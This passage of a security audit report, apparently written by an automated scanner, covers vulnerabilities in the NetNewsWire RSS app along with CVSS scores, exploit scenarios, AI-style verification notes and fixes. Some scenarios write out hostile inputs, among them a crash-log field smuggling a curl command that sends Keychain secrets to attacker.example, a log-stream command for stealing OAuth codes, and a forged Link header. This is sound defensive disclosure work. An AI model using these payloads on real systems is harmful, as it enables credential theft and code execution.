**Verdict:** TRUE_POSITIVE (confidence: 9/10) — real API keys embedded in released binary using trivially-reversible XOR with hardcoded salt; both operands are static `[UInt8]` arrays in the Mach-O binary, confirmed by build scripts and explicit code comments

**Analysis**

**A. What the code actually does (lines 42–55)**

The `.gyb` template is a Python-driven code generator. At build time it:
1. Generates a random 64-byte salt: `salt = [byte for byte in os.urandom(64)]`
2. For each secret, reads the env var (`os.environ.get(secret) or ""`), XOR-encodes each byte against the salt
3. Emits **both** the encoded bytes array **and** the 64-byte salt as `private static let` arrays in the generated Swift file

The `decode()` function simply reverses the XOR at runtime — with both operands being static byte arrays embedded in the binary. No keychain, no network fetch, no runtime secret.

**B. Call chain / entry points**

The generated `SecretKey.swift` is used in at least three places:
- `OAuthAuthorizationClient+Feedly.swift` lines 18–21: `SecretKey.feedlyClientID` / `SecretKey.feedlyClientSecret` — OAuth client credentials passed directly to Feedly's auth flow
- `ReaderAPICaller.swift` lines 586–587: `SecretKey.inoreaderAppID` / `SecretKey.inoreaderAppKey` — sent as HTTP headers to InoReader API
- `ArticleExtractor.swift` lines 40–41: `SecretKey.mercuryClientID` / `SecretKey.mercuryClientSecret` — used in HMAC for Mercury parser

The comment in `OAuthAuthorizationClient+Feedly.swift` line 16 explicitly states *"These placeholders are substituted at build time using a Run Script phase with build settings"*, confirming real production credentials are injected.

**C. Looking for defences**

**Build pipeline**: `ci.yml` runs `updateSecrets.sh` without any API key environment variables — CI gets empty-string encoded values. However, the Xcode schemes invoke `updateSecrets.sh` as a pre-build script for *all* builds, including App Store submissions done from a developer machine that *does* have the env vars set. CLAUDE.md itself states: *"Some features disabled in development builds due to private API keys"* — confirming real keys exist and are used in release builds.

**Obfuscation strength**: The XOR scheme with a hardcoded salt is definitively reversible. Both the `encoded` and `salt` arrays are `static let [UInt8]` — they appear verbatim in the `__DATA` or `__TEXT` segment of the Mach-O binary. A single Ghidra/Hopper session, or a Python one-liner reading the binary and XOR-ing two nearby byte literals, recovers plaintext in under a minute.

**`isRunningUnitTests` guard**: Only prevents unit test execution from seeing the plaintext — has no effect on binary analysis.

**No defence found** that prevents an attacker who downloads the App Store binary from recovering the embedded credentials.

**D. Probing edge cases**

There is no secondary encoding, no runtime key derivation, no server-side component. The scheme is pure compile-time obfuscation with both operands in the binary. Any encoding trick or null byte in the key would still be trivially recoverable via the XOR.

---

**Summary**: The scanner's description is technically accurate. For release/App Store builds, real third-party OAuth client credentials and API keys are XOR-encoded with a static salt, both of which are hardcoded in the distributed binary. This is trivially reversible by binary analysis — Feedly client ID/secret recovery could allow impersonation of the NetNewsWire OAuth client and API quota exhaustion for all NetNewsWire/Feedly users.

### 4. [HIGH] OAuth authorization code logged verbatim in system log
**Class:** CWE-532: Insertion of Sensitive Information into Log File
**CWE:** CWE-532: Insertion of Sensitive Information into Log File - https://cwe.mitre.org/data/definitions/532.html
**File:** `Modules/Account/Sources/Account/Feedly/OAuthAccountAuthorizationOperation.swift:164-169`
**CVSS 3.1:** **7.2** (High) — `CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:L (non-network)*
**Confidence:** 0.78 (1 run agreed)

#### Description
In `didEndAuthentication(url:error:)`, `url?.absoluteString` is unconditionally interpolated into two `Logger` calls: line 166 uses `.error` level (messages at this level ARE persisted to disk at `~/Library/Logs` and `/var/log/` and survive across reboots) and line 168 uses `.debug` level (not persisted to disk, but emitted to any active log-stream subscriber). The `url` parameter is the ASWebAuthenticationSession callback URL, which looks like `feedly://callback?code=AUTH_CODE&state=…`. The `AUTH_CODE` is the OAuth authorization code. On macOS, any process executing as the same user can subscribe to the app's log subsystem via `os_log`/`OSLogStore` APIs or the `log stream` command-line tool and capture `.debug`-level messages in real time; no elevated privilege is required for same-user log streaming. The `.error`-level log (line 166) is triggered when ASWebAuthenticationSession returns both a non-nil URL and a non-nil error — an edge case that can occur when the authorization server returns an error redirect that still carries a `code` parameter, or when the session times out mid-redirect.

#### Impact
The full OAuth callback URL — containing the single-use authorization code — is written to the unified system log. Any process running as the same macOS user can stream these log entries in real time and race the legitimate app to exchange the code for Feedly access and refresh tokens, gaining persistent access to the victim's Feedly account without ever knowing the user's password.

#### Exploit scenario
Attacker runs `log stream --predicate 'subsystem == "com.ranchero.NetNewsWire"' --level debug` as the same macOS user. Victim opens NetNewsWire and initiates Feedly OAuth login. When the browser redirects back to the app, line 168 emits the full callback URL to the log stream. Attacker extracts `AUTH_CODE` and immediately sends a POST to `https://cloud.feedly.com/v3/auth/token` with the stolen code and the known public client credentials (open-source app). If the attacker's token request arrives before the app's, the attacker receives a valid Feedly access token and refresh token scoped to the victim's account and can read, modify, or delete all their feeds and articles indefinitely (refresh tokens are long-lived).

#### Preconditions
- Attacker must be running as the same OS user account as the victim on macOS (same-user log access requires no elevated privileges), OR must have admin/root access to read persisted .error-level logs from disk
- For the .debug path (line 168): attacker must be actively subscribing to the log stream at the exact moment the OAuth callback fires — a narrow window of seconds
- Attacker must win a race to POST the code to Feedly's token endpoint before the legitimate app does; the code is single-use but Feedly's default validity window is 30–60 seconds

```
if let error {
    Self.logger.error("OAuthAccountAuthorizationOperation: didEndAuthentication url: \(url?.absoluteString ?? "") error: \(error.localizedDescription)")
} else {
    Self.logger.debug("OAuthAccountAuthorizationOperation: didEndAuthentication url: \(url?.absoluteString ?? "")")
}
```

#### How to fix
Remove `url?.absoluteString` from both log messages. Replace with a redacted placeholder: `Self.logger.debug("OAuthAccountAuthorizationOperation: didEndAuthentication — callback received")`. If the URL scheme/host is needed for diagnostics, log only `url?.scheme` and `url?.host`, never query parameters. Apple's `os_log` supports `{mask.hash}` privacy annotations (`\(url?.absoluteString ?? "", privacy: .private)`) as a minimum mitigation, but complete removal of the URL from log output is preferred because `.private` annotations can be overridden with MDM profiles. Additionally ensure `OAuthAuthorizationResponse.init` validates the OAuth `state` round-trip to prevent code-injection CSRF even if the log leak is closed.

**Exploitability:** Feedly OAuth authorization code is logged at ERROR level (persisted to disk in ~/Library/Logs) and DEBUG level (visible via os_log stream) verbatim in the callback URL. Any same-user process can read the persisted log or subscribe to the log stream and steal the code for immediate exchange. CVSS ~7.0 (AV:L/AC:H/PR:L/UI:R/S:C/C:H/I:H); borderline High/Medium — downgraded per 'can't decide → pick lower tier' rule due to AV:L + AC:H + specific edge-case trigger.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — `url?.absoluteString` logged verbatim at `.debug` level on the normal OAuth success path; same-user `log stream` captures it without elevated privileges, enabling code theft and Feedly account takeover

I now have a complete picture. Let me summarize the verified analysis:

---

**Findings**

**A. Code verification (lines 164–169)**  
The snippet is accurate and matches the real source. Both logger calls unconditionally interpolate `url?.absoluteString`:
- Line 166 (`.error`): fires when ASWebAuthenticationSession returns both a non-nil `url` AND a non-nil `error` — an edge case, but real.
- Line 168 (`.debug`): fires on the **normal success path** — every successful Feedly OAuth login.

**B. The callback URL contains a live OAuth code**  
From `OAuthAuthorizationClient+Feedly.swift` line 19, the redirect URI is `netnewswire://auth/feedly`. The ASWebAuthenticationSession callback delivers a URL of the form `netnewswire://auth/feedly?code=AUTH_CODE&state=…`. `absoluteString` exposes `AUTH_CODE` verbatim. No redaction, no masking.

**C. External entry point**  
The normal user action — adding a Feedly account in preferences — is the real entry point. This is a production code path exercised routinely.

**D. Log-stream access without elevation**  
macOS's `log stream --predicate 'subsystem == "com.ranchero.NetNewsWire"' --level debug` is runnable by any process executing as the same OS user (no `sudo`). The debug message at line 168 is emitted on every successful OAuth callback and is captured in real time by any such subscriber. The `.error` log (line 166) is persisted to the unified log store (`/var/db/diagnostics/`) and requires admin/root or the `com.apple.logging.local-diagnostics` entitlement to read back — narrower, but still real.

**C/D defence check**  
No URL sanitization or parameter redaction is applied before either log call. `OAuthAuthorizationResponse.init(url:client:)` parses the `code` from the URL after logging — the log fires first, unconditionally.

**Mitigating factors (acknowledged, not dispositive)**  
- Same-user execution is a prerequisite — if the attacker already has this, many attack vectors exist.  
- The `.debug` path is a narrow window (seconds); the attacker must be actively streaming logs and must win a race to redeem the code before the app.  
- Feedly codes have a 30–60 s validity window; the race is tight but automatable with a scripted `log stream` watcher.  

The finding is genuine: an OAuth authorization code belonging to the user is logged at `.debug` level on every successful Feedly login, readable by any co-resident same-user process without elevated privileges.

---

### 5. [HIGH] Bash arithmetic injection via attacker-controlled crash log fields
**Class:** CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)
**CWE:** CWE-78: Improper Neutralization of Special Elements used in an OS Command (OS Command Injection) - https://cwe.mitre.org/data/definitions/78.html
**File:** `scripts/symbolicate_json_crash.sh:209-221`
**CVSS 3.1:** **7.8** (High) — `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:L (non-network)*
**Confidence:** 0.90 (1 run agreed)

#### Description
Line 210 captures `.imageOffset` from a frame JSON object and line 217 captures `.base` from the `usedImages` array. Both are extracted with `jq -r` from the second line of the attacker-supplied crash file and stored verbatim into `$image_offset` and `$base_address`. At line 220 these untrusted strings are passed directly into a bash arithmetic context: `actual_address=$((base_address + image_offset))`. Bash performs variable expansion inside `$((...))` before computing the arithmetic: if `$image_offset` evaluates to the string `$(malicious_cmd)`, bash treats it as a command substitution and executes `malicious_cmd` even before any arithmetic error can abort the expansion. No validation, type-checking, or allow-listing is applied to either variable between extraction and the arithmetic expansion.

#### Impact
A developer who runs this script against a malicious crash log (e.g., received from an app user via a bug report) executes arbitrary OS commands with their own privileges on their workstation. The attacker only needs to craft a JSON crash file with a shell command substitution embedded in a numeric-typed field. Any secrets in the developer's environment (SSH keys, Xcode credentials, Keychain entries accessible to the shell) are at risk.

#### Exploit scenario
Attacker crafts a crash log whose second line contains `"imageOffset": "$(curl -s https://attacker.example/exfil?k=$(security find-generic-password -s NetNewsWire -w 2>/dev/null | base64) &)"` inside a thread frame. Developer receives the file as an alleged user crash report and runs `./scripts/symbolicate_json_crash.sh user_crash.log`. Bash evaluates `$((0 + $(curl ...)))` within the while loop: the `curl` command fires, exfiltrating Keychain credentials, then the arithmetic fails silently and the script continues normally, leaving no obvious trace of the execution.

#### Preconditions
- Attacker can deliver a crafted JSON crash log to the developer (e.g., via a fake bug report, GitHub issue attachment, or email)
- Developer runs the script against the malicious file on their workstation

```
image_offset=$(echo "$frame_json" | jq -r '.imageOffset')
...
base_address=$(echo "$image_info" | jq -r '.base')
...
actual_address=$((base_address + image_offset))   # shell executes $() inside untrusted value
```

#### How to fix
Before using any jq-extracted value in arithmetic, assert it is a pure decimal or hex integer. Replace the bare arithmetic expansion with an explicit sanitisation step: `if ! [[ "$image_offset" =~ ^[0-9]+$ ]] || ! [[ "$base_address" =~ ^[0-9]+$ ]]; then print_warning "Skipping frame with non-numeric address fields"; continue; fi` immediately after lines 210 and 217, and use `$(( 10#${base_address} + 10#${image_offset} ))` to force base-10 interpretation and prevent octet or hex re-evaluation. Apply the same guard to every other variable derived from jq output that is subsequently used in arithmetic or unquoted shell contexts.

**Exploitability:** symbolicate_json_crash.sh passes jq-extracted crash-log fields ($image_offset, $base_address) directly into bash arithmetic $((...)), allowing command substitution if either variable contains $(cmd). CVSS ~7.4 (AV:L/AC:L/PR:N/UI:R/C:H/I:H/A:H) but downgraded one tier: this is a developer crash-symbolication tool (non-prod code), not shipped app code. Requires a developer to process a crafted crash log.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — untrusted crash log fields flow without validation into bash `$((…))` arithmetic expansion, which evaluates embedded command substitutions; full code-execution on the developer's machine

**Analysis**

**A. What the code actually does (lines 206–224)**

- **Line 210**: `image_offset=$(echo "$frame_json" | jq -r '.imageOffset')` — `jq -r` outputs the raw JSON string value; no type assertion.
- **Line 217**: `base_address=$(echo "$image_info" | jq -r '.base')` — same raw extraction.
- **Line 220**: `actual_address=$((base_address + image_offset))` — **direct bash arithmetic expansion** with both untrusted strings.

There is **zero validation** (numeric check, regex, integer cast) between extraction and the `$((…))` sink.

**B. Call-chain / entry point**

The crash log file path comes from `$1` (line 48), which is saved verbatim to `CRASH_JSON` via `tail -n +2 "$CRASH_LOG" > "$CRASH_JSON"` (line 84). This file is an **attacker-supplied external artifact** (crash reports are routinely submitted by users via GitHub issues, email, or bug trackers). A developer runs the script against it locally. The trust boundary is clearly crossed.

**C. Does the injection actually execute?**

Yes. In bash, `$((...))` performs arithmetic expansion. During evaluation, variable names inside the arithmetic context (written *without* `$`) are looked up and their values substituted back into the arithmetic expression. If a substituted value contains `$(cmd)`, bash **recursively evaluates that command substitution** before attempting the arithmetic. This is a well-documented bash property (also exploited in CVE-class findings for other shell scripts).

Concrete mechanics:
```bash
image_offset='$(id)'          # attacker controls this via .imageOffset in JSON
actual_address=$((0 + image_offset))
# bash expands: $((0 + $(id)))
# executes `id` THEN sees non-numeric result
```
`set -e` (line 17) cannot save this: the command substitution fires *during* expansion, *before* bash registers the non-numeric arithmetic error.

**D. Defences present?**

None. No `[[ $image_offset =~ ^[0-9]+$ ]]` guard, no `printf '%d'` coercion, no allow-list. The values go directly from `jq -r` output to `$((…))`.

---

**Verdict**: The technical vulnerability is real and confirmed in the actual source. The data flows from an external, attacker-writable crash log through raw `jq` extraction into bash arithmetic expansion with no sanitisation. The exploit requires social engineering (delivering a malicious crash log to a developer), but that is the standard delivery mechanism for crash reports in this project — the trust boundary is explicitly crossed.

### 6. [HIGH] Unpinned third-party repo fetched then executed without integrity check
**Class:** CWE-494
**CWE:** CWE-494 - https://cwe.mitre.org/data/definitions/494.html
**File:** `scan-netnewswire.sh:49-62`
**CVSS 3.1:** **8.0** (High) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.82 (1 run agreed)

#### Description
Lines 49–50 clone `https://github.com/visa/visa-vulnerability-agentic-harness.git` with `--depth 1` — a shallow clone that retrieves whatever HEAD currently points to on the default branch, with no pinned commit SHA, no GPG-signed tag assertion, and no hash verification. Immediately after (lines 55–62), the script changes into that directory and runs `pip install --quiet .`, which executes the repo's `setup.py` / `pyproject.toml` build hooks as the current user. Control then transfers to `vvaharness setup --install-agents`, `vvaharness doctor`, and finally `vvaharness scan --repo "$TARGET_DIR"` (line 105), the last of which is explicitly documented to EDIT source files inside TARGET_DIR. The entire trust chain from the external repo to arbitrary file modification on the developer's machine has zero integrity checkpoints.

#### Impact
A developer who runs this script fetches, installs, and immediately executes arbitrary code from an external GitHub repository with no commit-hash, tag-signature, or checksum verification. If the upstream repo or the 'visa' GitHub account is compromised, the attacker gains code execution on every developer machine that runs the script. Because the installed tool is then invoked in FIX MODE (--repo flag pointing at the NetNewsWire source tree), a supply-chain compromise can also inject malicious changes directly into the cloned NetNewsWire source files, which the developer is then instructed to review only via 'git diff'.

#### Exploit scenario
An attacker with write access to `visa/visa-vulnerability-agentic-harness` (e.g., via a compromised maintainer account or a dependency confusion attack against the package installed in `setup.py`) pushes a malicious commit to the default branch. A NetNewsWire developer subsequently runs `./scan-netnewswire.sh`, which blindly clones and installs the poisoned package. The malicious `pip install` runs arbitrary code during the build-hook phase (e.g., exfiltrates SSH keys, installs a backdoor). The `vvaharness scan` stage then writes attacker-controlled 'remediation' patches into the NetNewsWire source tree, where they may later be committed and shipped to end users.

#### Preconditions
- Attacker must compromise the upstream GitHub repository 'visa/visa-vulnerability-agentic-harness' (e.g., compromised maintainer credentials, malicious PR merge, or dependency-confusion attack on a package it installs)
- A developer must run scan-netnewswire.sh after the malicious commit lands on the default branch

```
  git clone --depth 1 "$HARNESS_REPO" "$HARNESS_DIR"
...
  pip install --quiet --upgrade pip
  pip install --quiet .
```

#### How to fix
Pin the clone to a specific audited commit SHA rather than HEAD of the default branch: replace `git clone --depth 1 "$HARNESS_REPO" "$HARNESS_DIR"` with a clone followed by `git -C "$HARNESS_DIR" checkout <known-good-SHA>`. Additionally, generate a lockfile with `pip-compile --generate-hashes` for the harness's dependencies and install with `pip install --require-hashes -r requirements.lock` instead of `pip install .`. If the repo publishes signed releases, verify the GPG signature on the tag before proceeding.

**Exploitability:** scan-netnewswire.sh shallow-clones an external GitHub repo at HEAD with no pinned SHA, pip-installs it (executes build hooks), then runs vvaharness scan which explicitly edits source files in TARGET_DIR. CVSS ~7.6 (AV:N/AC:H/S:C/C:H/I:H) but downgraded one tier: this is a security-scanning harness script (non-prod tooling), not shipped app code. Attacker must first compromise the external repo's default branch.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Script confirmed to clone an unpinned external repo and immediately execute its build hooks via `pip install`, with no SHA pin, tag signature check, or hash manifest; impact crosses from developer machine to production source tree via vvaharness's documented file-editing scan stage.

Now I have the full picture. Let me analyze what the code actually does versus what the scanner claimed.

**Verified facts from the actual file:**

- **Line 50**: `git clone --depth 1 "$HARNESS_REPO" "$HARNESS_DIR"` — confirmed, shallow clone with no pinned SHA, no GPG tag, no hash verification.
- **Lines 45-47**: If already cloned, does `git pull --ff-only` — also unpinned and accepts whatever HEAD is on the default branch.
- **Lines 61-62**: `pip install --quiet --upgrade pip` and `pip install --quiet .` — confirmed, runs the cloned repo's build hooks as the current user.
- **Line 73**: `vvaharness setup --install-agents`
- **Line 77**: `vvaharness doctor`
- **Line 105**: `vvaharness scan --repo "$TARGET_DIR"` — confirmed, explicitly documented at line 9 and lines 83/98 to **edit source files** in TARGET_DIR.
- **Lines 85-87**: The script does enforce a clean git working tree in TARGET_DIR before the scan, making edits reviewable via `git diff`. This is a minor mitigation for the *downstream* injection risk, but it does **nothing** to prevent RCE during `pip install` (step 3 in the attack chain).
- **Lines 99-103**: There is an explicit `[y/N]` prompt before the full scan runs. This addresses the *user awareness* of edits but not the supply-chain integrity of the package being installed.

**Walking the trust chain:**

There are zero integrity checkpoints between the GitHub remote and arbitrary code execution:
1. No `--branch <tag>` with a signed-tag assertion.
2. No pinned commit SHA (e.g., `git checkout <sha>` after clone).
3. No hash manifest checked before `pip install`.
4. `pip install .` runs `setup.py`/`pyproject.toml` build hooks at install time — this is standard Python behaviour and is an established vector for supply-chain attacks (ref: recent SolarWinds, xz-utils, PyPI-poisoning incidents).

**Checking whether this is "out of scope":**

The Out-of-Scope rule for "build/tooling scripts run only on a developer's own workstation" has an explicit **exception**: *"if the value crosses a boundary … treat it as untrusted."* Here the malicious input is a **remote GitHub repo** (not local argv or env), and the impact crosses two boundaries: (a) RCE on the developer's machine, and (b) attacker-authored "remediation" patches written into the NetNewsWire source tree, which could be committed and shipped to end users. This clearly crosses a boundary and falls under the exception.

**Mitigations — do any fully close the path?**
- The clean-working-tree check (lines 85-87) makes injected source edits *reviewable*, but doesn't prevent the `pip install` RCE that precedes it.
- The `[y/N]` prompt (lines 99-103) fires after `pip install` already ran; it's too late.
- No other defences found.

**Conclusion:**

The scanner's description is accurate in all material respects. The finding is a textbook unpinned-dependency supply-chain risk with a clear, realistic exploit path (upstream repo compromise → developer runs script → RCE during install → source-tree poisoning). Attack complexity is HIGH (requires upstream repo compromise), user interaction is required (developer must run the script), but there are zero integrity checkpoints and the impact is high on both confidentiality (credential/key exfiltration during install) and integrity (malicious patches in the shipped app).

### 7. [MEDIUM] Feedbin credentials forwarded to server-supplied pagination URL
**Class:** CWE-522: Insufficiently Protected Credentials
**CWE:** CWE-522: Insufficiently Protected Credentials - https://cwe.mitre.org/data/definitions/522.html
**File:** `Modules/Account/Sources/Account/Feedbin/FeedbinAPICaller.swift:356-369`
**CVSS 3.1:** **6.8** (Medium) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.78 (1 run agreed)

#### Description
retrieveEntries(page:) at line 356 accepts a page string that originates from the HTTP Link response header returned by the Feedbin API. The string is converted to a URL via URL(string:) with no validation that the resulting host matches feedbinBaseURL.host ('api.feedbin.com'). A URLRequest is then constructed at line 365 with that arbitrary URL AND the full Credentials object attached via the credentials parameter — which, following the pattern used throughout FeedbinAPICaller, adds an Authorization: Basic header containing the user's Feedbin username and password. The session.send(request:) call dispatches this credential-bearing request to whatever host appeared in the Link header. The same untrusted nextPage value is also produced at line 306–307 inside retrieveEntries(feedID:) and at lines 350–353 inside retrieveEntries(), both of which are paginated by FeedbinAccountDelegate by calling retrieveEntries(page:) on the returned value — extending the attack surface to any paginated Feedbin response. No host-pinning or allowlist check is performed anywhere along this path.

#### Impact
A compromised or attacker-operated Feedbin server can exfiltrate the victim's Feedbin credentials (username and password / HTTP Basic Auth) by returning a crafted Link pagination header. The stolen credentials give the attacker full access to the victim's Feedbin account, including all subscriptions and article history. Any user whose NetNewsWire is configured with a Feedbin account and performs an automatic or manual sync is affected.

#### Exploit scenario
An attacker compromises the Feedbin server or mounts a MITM on the TLS session between the app and api.feedbin.com. They inject the header 'Link: <https://attacker.example.com/collect>; rel="next"' into any paginated entries response. On the next sync cycle NetNewsWire calls retrieveEntries(page: "https://attacker.example.com/collect"), constructs a URLRequest with Authorization: Basic <base64(username:password)>, and sends it to attacker.example.com. The attacker's server logs the Authorization header and decodes the victim's plaintext Feedbin credentials.

#### Preconditions
- The Feedbin API server is compromised or operated by the attacker, OR the attacker can intercept/modify HTTPS traffic between the app and api.feedbin.com (e.g., rogue certificate authority, corporate TLS inspection, or device with a trusted root installed)
- The victim has a Feedbin account configured in NetNewsWire and the app performs at least one sync cycle (automatic timer or manual refresh)

```
func retrieveEntries(page: String) async throws -> ([FeedbinEntry]?, String?) {
	if suspended {
		throw WebserviceError.suspended
	}

	guard let url = URL(string: page) else {
		return (nil, nil)
	}

	let request = URLRequest(url: url, credentials: credentials)   // ← credentials attached to untrusted URL
	let (response, entries) = try await session.send(request: request, resultType: [FeedbinEntry].self)
	let pagingInfo = HTTPLinkPagingInfo(urlResponse: response)
	return (entries, pagingInfo.nextPage)
}
```

#### How to fix
Before constructing a credential-bearing URLRequest from any server-supplied URL, validate that the URL's host exactly matches the expected API host. At line 361–363, replace the existing guard with: `guard let url = URL(string: page), url.host == feedbinBaseURL.host, url.scheme == feedbinBaseURL.scheme else { return (nil, nil) }`. Apply the same host-pinning check inside any future method that passes a server-returned URL to URLRequest with credentials. Alternatively, use URLComponents to reconstruct the URL from the trusted base and only adopt the server-supplied path and query parameters.

**Exploitability:** FeedbinAPICaller.retrieveEntries(page:) constructs a URLRequest to the server-supplied pagination URL from the Link response header and attaches the full Authorization:Basic header (Feedbin username and password) with no host-allowlist check. An attacker controlling the Feedbin API server or on-path for the API connection can redirect credential-bearing requests to any host. CVSS ~7.2 (AV:N/AC:H/PR:N/UI:N/S:C/C:H). AC:H reflects API-server compromise or MITM requirement; impact is full Feedbin credential disclosure.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — No host validation on the Link-header pagination URL; Feedbin Basic credentials are sent to whatever host the server supplies; no defence exists anywhere in the call chain.

I have enough information to render a verdict. Let me summarize my findings:

**A — What the code actually does (confirmed):**
- Line 356–369: `retrieveEntries(page:)` calls `URL(string: page)` with no host check, then `URLRequest(url: url, credentials: credentials)`, then `session.send(request:)`.
- `URLRequest+Account.swift` line 16–28: The `.basic` credentials initializer unconditionally writes `Authorization: Basic <base64>` into **whatever URL** is passed in. No host guard.
- `HTTPLinkPagingInfo.swift` lines 26–34: The `Link` header is parsed by splitting on `,` and `;`, the raw URL string between `<>` is stored verbatim as `nextPage` with zero host validation.
- `feedbinBaseURL` is hardcoded as `https://api.feedbin.com/v2/` — not user-configurable — so the only way to inject a bad `nextPage` is through a tampered response from that server.

**B — External entry point:**
The trigger is an HTTP response from `api.feedbin.com`. The `Link: <https://attacker.example.com/…>; rel="next"` header injected there flows without any mutation through `HTTPLinkPagingInfo.nextPage → retrieveEntries(page:) → URLRequest(url:credentials:) → session.send(request:)`. The `URLSession.webservice` is a plain session with no custom delegate; credentials are in the initial request, not a cross-host redirect, so Apple's cross-host redirect-stripping is not invoked.

**C — Defences searched:**
- No host/allowlist check anywhere between the Link header extraction and the outbound request.
- `NSAllowsArbitraryLoads:true` (noted in architecture scan) means ATS won't block an HTTP exfiltration endpoint.
- `URLSession.webservice` has no pinning or delegate that inspects the URL before dispatch.

**D — Preconditions:**
Exploiting this requires either (a) compromise of the `api.feedbin.com` server, or (b) MITM on the TLS session (rogue/trusted CA, corporate TLS inspection). These are non-trivial. However, the code defect is real and the impact is full credential disclosure. In corporate MDM environments trusted-CA MITM is routine. A fix (validate `url.host == feedbinBaseURL.host` before constructing the credentialed request) is one line.

### 8. [MEDIUM] Unvalidated arbitrary URL fetched via netnewswire theme deep link
**Class:** CWE-918: Server-Side Request Forgery (SSRF)
**CWE:** CWE-918: Server-Side Request Forgery (SSRF) - https://cwe.mitre.org/data/definitions/918.html
**File:** `iOS/SceneDelegate.swift:195-214`
**CVSS 3.1:** **6.1** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
In scene(_:openURLContexts:) at lines 189-214, after confirming only that URLComponents.host == 'theme' (the host of the outer netnewswire:// URL), the code reads the raw string value of the 'url' query item (providedThemeURL at line 195), constructs a URL from it with no scheme restriction and no host allowlist (line 196), wraps it in a URLRequest (line 197), and immediately calls URLSession.shared.downloadTask (line 202) which follows HTTP redirects by default. There is no guard against http://, ftp://, or internal IP addresses. Any URL reachable from the device's network interface — including RFC-1918 addresses — will be fetched. The response body is passed to ArticleThemeDownloader.handleFile(at:) which performs unvalidated zip extraction.

#### Impact
Any web page or app can silently instruct NetNewsWire to issue a network request to any attacker-controlled URL, disclosing the victim's IP address and enabling enumeration of internal network services. This is also the mandatory first step of the zip-slip chain described separately; without this finding, a remote attacker cannot feed a malicious archive to the extractor.

#### Exploit scenario
Attacker embeds <a href="netnewswire://theme/add?url=https://10.0.0.1/admin">Click me</a> on a phishing page. When the victim confirms the iOS system prompt, the app makes a GET request to the internal router's admin interface. The attacker's server (via a redirect from https://attacker.com/) receives the response body if they control the initial URL; at minimum, the victim device's external IP and User-Agent are logged by any https://attacker.com endpoint. Used as the entry point for the zip-slip chain, the attacker replaces the target with a malicious archive URL to achieve persistent code execution in WKWebView.

#### Preconditions
- Victim must tap a crafted netnewswire:// link and confirm the iOS system prompt ('Open in NetNewsWire?') — one user interaction.
- Target URL must be reachable from the victim's network interface.

```
if let providedThemeURL = queryItems.first(where: { $0.name == "url" })?.value {
    if let themeURL = URL(string: providedThemeURL) {
        let request = URLRequest(url: themeURL)   // no scheme/host validation
        // ...
        let task = URLSession.shared.downloadTask(with: request) { location, _, error in
            // ...
            try ArticleThemeDownloader.shared.handleFile(at: location)
        }
        task.resume()
    }
}
```

#### How to fix
At iOS/SceneDelegate.swift:196, before constructing URLRequest, validate that themeURL.scheme == "https" and optionally check the host against an allowlist of trusted theme distribution domains. Reject and display an error for any other scheme or disallowed host. This prevents both SSRF and removes the downloader as a vector for the zip-slip attack chain: guard themeURL.scheme == "https" else { return }.

**Exploitability:** netnewswire://theme/add?url= on iOS accepts any URL (http://, ftp://, RFC-1918 addresses) without host or scheme validation, triggers a URLSession download to that URL, and passes the result to unvalidated zip extraction. Triggerable from any web page via a single-click link, requiring only UI:R. CVSS 6.1 (AV:N/AC:L/PR:N/UI:R/S:C). Primary entry point for the deep-link → zip-slip → persistent WKWebView JS chain.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — confirmed unvalidated arbitrary-URL fetch via registered URL scheme; no scheme/host allowlist, ATS disabled, no user confirmation before download fires; zip-slip in downstream handler compounds impact

I now have enough information for a complete analysis. Here is my assessment:

**Analysis Summary**

**A. What the code actually does (lines 189–214)**

The `scene(_:openURLContexts:)` handler (line 109) is the real entry point. It only checks that the outer URL's host component equals `"theme"` (line 190) — i.e. it is a `netnewswire://theme/...` URL. It then extracts the raw `"url"` query-item value verbatim (line 195), constructs `URL(string: providedThemeURL)` (line 196) with **zero scheme or host filtering**, wraps it in a `URLRequest` (line 197), and immediately calls `URLSession.shared.downloadTask(with: request)` (line 202). The download response is handed to `ArticleThemeDownloader.shared.handleFile(at:)`.

**B. Call chain / entry point**

- `netnewswire://` is registered as a URL scheme in `iOS/Resources/Info.plist` (line 49). Any web page can trigger this via `<a href="netnewswire://theme/add?url=...">` — iOS will prompt once ("Open in NetNewsWire?") and then invoke `scene(_:openURLContexts:)`. This is a confirmed, unauth-reachable entry point.

**C. Looking for defences — none found**

- **No scheme allowlist**: `file://`, `http://`, `ftp://`, RFC-1918 addresses — all accepted.
- **ATS disabled globally** (`NSAllowsArbitraryLoads: true` in iOS Info.plist), so plain HTTP to any host succeeds.
- **No user confirmation dialog** before the download fires — `didBeginDownloadingTheme` is a progress notification, not a gate.
- **No validation in `ArticleThemeDownloader.handleFile`**: calls straight through to `Zip.unzipFile()` (marmelroy/Zip, unversioned commit `059e7346`) which does not strip `../` path components — all archive entries are extracted before `findThemeFile` checks the result, meaning a malicious zip can write arbitrary files inside the app sandbox alongside the `.nnwtheme` check.

**D. Defence probe**

The only guard is the `comps.host == "theme"` check — this governs the *outer* `netnewswire://` URL, not the embedded `url=` value. There is no secondary gate anywhere in the call chain.

**Impact assessment**

